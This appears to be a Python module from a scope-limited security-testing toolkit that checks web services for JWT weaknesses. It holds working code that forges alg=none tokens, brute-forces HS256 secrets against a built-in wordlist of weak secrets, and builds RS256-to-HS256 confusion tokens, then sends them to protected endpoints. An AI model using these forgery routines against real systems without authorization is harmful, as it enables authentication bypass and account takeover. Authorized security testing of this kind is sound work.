"""Phase 4.3 (security-playbook.md) JWT tampering — black-box only, same
`jwt_tool`-style techniques (alg confusion, weak-secret brute force) but
no browser or external binary needed. Pure HTTP + stdlib crypto.

Covers:
  - claim checks: missing `exp`/`iss`/`aud` (decode-only, no network)
  - `alg: none` bypass: strip the signature, resubmit, see if it's accepted
  - weak-secret brute force: try re-signing with a small built-in wordlist
    of common/leaked JWT secrets — confirmed purely by matching signatures,
    no server round-trip needed to prove a weak secret is in use
  - RS256->HS256 confusion: if a JWKS/public key is available, try
    re-signing as HS256 using that public key as the "secret"
  - storage hint: does the token come back as a cookie (check the
    HttpOnly flag, visible in plain HTTP headers) or in the JSON body
    (the pattern that leads to localStorage) — no headless browser needed,
    since this is observable from the login response alone.

This is a signal generator — a flagged "accepted" result confirms the
server is actually vulnerable (we successfully used the forged token on
a real protected endpoint), but a missing claim or a storage hint is
something to confirm against the app's actual behavior before reporting.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from dataclasses import dataclass

import requests

from security_toolkit.config import Target
from security_toolkit.scope_guard import resolve_in_scope_url

REQUIRED_CLAIMS = ("exp", "iss", "aud")

# A small, well-known set of weak/default JWT secrets seen in the wild
# (framework defaults, tutorial copy-paste, short dictionary words). Not
# exhaustive — this is the quick, free check; a real engagement would
# hand this list to `hashcat -m 16500` against a captured token instead.
WEAK_SECRET_WORDLIST = (
    "secret",
    "password",
    "123456",
    "changeme",
    "jwt_secret",
    "your-256-bit-secret",
    "supersecret",
    "secretkey",
    "mysecret",
    "default",
    "admin",
    "qwerty",
    "letmein",
    "test",
    "development",
)


class JwtDecodeError(ValueError):
    """Raised when a string doesn't look like a valid JWT."""


@dataclass(frozen=True)
class DecodedJwt:
    header: dict
    payload: dict
    header_b64: str
    payload_b64: str
    signature_b64: str


@dataclass(frozen=True)
class JwtFinding:
    check: str
    flagged: bool
    detail: str


def _b64url_decode(segment: str) -> bytes:
    padded = segment + "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(padded)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def decode_jwt(token: str) -> DecodedJwt:
    """Decode a JWT's header/payload WITHOUT verifying the signature —
    this is deliberate: we're inspecting/tampering with an untrusted
    token, not trusting one.
    """
    parts = token.split(".")
    if len(parts) != 3:
        raise JwtDecodeError(f"Expected a 3-part JWT (header.payload.signature), got {len(parts)} part(s).")
    header_b64, payload_b64, signature_b64 = parts
    try:
        header = json.loads(_b64url_decode(header_b64))
        payload = json.loads(_b64url_decode(payload_b64))
    except (ValueError, UnicodeDecodeError) as exc:
        raise JwtDecodeError(f"Could not decode JWT segments as JSON: {exc}") from exc
    return DecodedJwt(
        header=header, payload=payload, header_b64=header_b64, payload_b64=payload_b64, signature_b64=signature_b64
    )


def check_jwt_claims(token: str) -> JwtFinding:
    """Flag any of exp/iss/aud missing from the payload."""
    decoded = decode_jwt(token)
    missing = tuple(claim for claim in REQUIRED_CLAIMS if claim not in decoded.payload)
    flagged = bool(missing)
    detail = (
        f"Missing claim(s): {missing}. A token without these can't be properly scoped/expired by a careful verifier."
        if flagged
        else "All of exp/iss/aud are present."
    )
    return JwtFinding(check="claims", flagged=flagged, detail=detail)


def check_token_storage_hint(set_cookie_headers: tuple[str, ...], token_in_json_body: bool) -> JwtFinding:
    """Black-box hint at where the token is likely to end up client-side,
    without a browser: a JWT-shaped Set-Cookie without HttpOnly is
    readable by page JS exactly like localStorage would be; a token
    returned only in the JSON body (no cookie at all) is the classic
    "the client is expected to store this itself" shape, which commonly
    means localStorage.
    """
    jwt_cookie_without_httponly = [
        header
        for header in set_cookie_headers
        if header.split("=", 1)[-1].split(";", 1)[0].count(".") == 2  # looks JWT-shaped: two dots
        and "httponly" not in header.lower()
    ]
    if jwt_cookie_without_httponly:
        return JwtFinding(
            check="storage_hint",
            flagged=True,
            detail=f"FLAGGED: a JWT-shaped cookie is missing the HttpOnly flag — readable by page JS: {jwt_cookie_without_httponly}",
        )
    if token_in_json_body and not set_cookie_headers:
        return JwtFinding(
            check="storage_hint",
            flagged=True,
            detail="FLAGGED: the token comes back only in the JSON response body, not a cookie — the "
            "classic pattern for client-side (often localStorage) storage. Confirm manually in the app's JS.",
        )
    return JwtFinding(check="storage_hint", flagged=False, detail="No localStorage/non-HttpOnly-cookie signal observed.")


def _resubmit(target: Target, protected_path: str, token: str, timeout: float = 10.0) -> requests.Response:
    url = resolve_in_scope_url(target, protected_path)
    return requests.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=timeout)


def check_alg_none_bypass(target: Target, protected_path: str, token: str, timeout: float = 10.0) -> JwtFinding:
    """Rebuild the token with header {"alg": "none"} and no signature,
    resubmit it on a protected endpoint. Flags if it's accepted.
    """
    decoded = decode_jwt(token)
    forged_header = _b64url_encode(json.dumps({**decoded.header, "alg": "none"}).encode())
    forged_token = f"{forged_header}.{decoded.payload_b64}."

    response = _resubmit(target, protected_path, forged_token, timeout=timeout)
    flagged = 200 <= response.status_code < 300
    detail = (
        f"status={response.status_code}; FLAGGED: an unsigned alg=none token was accepted on {protected_path}."
        if flagged
        else f"status={response.status_code}; the alg=none token was rejected, as expected."
    )
    return JwtFinding(check="alg_none_bypass", flagged=flagged, detail=detail)


def check_weak_hs256_secret(
    token: str, wordlist: tuple[str, ...] = WEAK_SECRET_WORDLIST
) -> tuple[JwtFinding, str | None]:
    """Try re-signing the token's header+payload with each candidate
    secret via HS256 and compare to the real signature. No network call
    needed — a match proves the secret purely by cryptography. Returns
    (finding, matched_secret_or_None).
    """
    decoded = decode_jwt(token)
    if decoded.header.get("alg") != "HS256":
        return (
            JwtFinding(
                check="weak_hs256_secret",
                flagged=False,
                detail=f"Token uses alg={decoded.header.get('alg')!r}, not HS256 — this check doesn't apply.",
            ),
            None,
        )

    signing_input = f"{decoded.header_b64}.{decoded.payload_b64}".encode()
    real_signature = _b64url_decode(decoded.signature_b64)

    for candidate in wordlist:
        computed = hmac.new(candidate.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(computed, real_signature):
            return (
                JwtFinding(
                    check="weak_hs256_secret",
                    flagged=True,
                    detail=f"FLAGGED: the signing secret is in a common wordlist (matched one of {len(wordlist)} candidates).",
                ),
                candidate,
            )

    return (
        JwtFinding(
            check="weak_hs256_secret",
            flagged=False,
            detail=f"None of {len(wordlist)} common secrets matched. Doesn't prove the secret is strong — "
            "only that it's not in this small wordlist.",
        ),
        None,
    )


def check_rs256_to_hs256_confusion(
    target: Target, protected_path: str, token: str, public_key_pem: str, timeout: float = 10.0
) -> JwtFinding:
    """If the server's RS256 public key is known (e.g. from a JWKS
    endpoint found during recon) and the verifier doesn't pin the
    algorithm, re-signing as HS256 using that public key string as the
    HMAC secret is a classic bypass. Flags if the forged token is accepted.
    """
    decoded = decode_jwt(token)
    forged_header_b64 = _b64url_encode(json.dumps({**decoded.header, "alg": "HS256"}).encode())
    signing_input = f"{forged_header_b64}.{decoded.payload_b64}".encode()
    forged_signature = hmac.new(public_key_pem.encode(), signing_input, hashlib.sha256).digest()
    forged_token = f"{forged_header_b64}.{decoded.payload_b64}.{_b64url_encode(forged_signature)}"

    response = _resubmit(target, protected_path, forged_token, timeout=timeout)
    flagged = 200 <= response.status_code < 300
    detail = (
        f"status={response.status_code}; FLAGGED: an RS256->HS256-confused token (signed with the public "
        f"key as an HMAC secret) was accepted on {protected_path}."
        if flagged
        else f"status={response.status_code}; the confused token was rejected, as expected."
    )
    return JwtFinding(check="rs256_to_hs256_confusion", flagged=flagged, detail=detail)
